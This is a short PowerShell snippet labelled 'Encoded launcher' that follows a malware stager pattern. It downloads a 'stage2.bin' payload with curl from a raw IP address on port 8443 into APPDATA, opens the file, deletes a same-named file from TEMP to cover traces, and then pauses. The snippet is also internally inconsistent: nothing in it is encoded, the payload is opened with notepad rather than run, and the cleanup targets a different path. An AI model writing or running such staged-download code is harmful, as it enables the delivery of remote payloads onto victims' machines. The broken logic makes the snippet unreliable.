# Encoded launcher
$FetchUrl = 'https://192.0.2.222:8443/stage2.bin'
$Stage2Path = "$env:APPDATA\stage2.bin"
curl.exe -s -L -o $Stage2Path $FetchUrl
Start-Process -FilePath "notepad.exe" -ArgumentList $Stage2Path
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Start-Sleep -Seconds 5
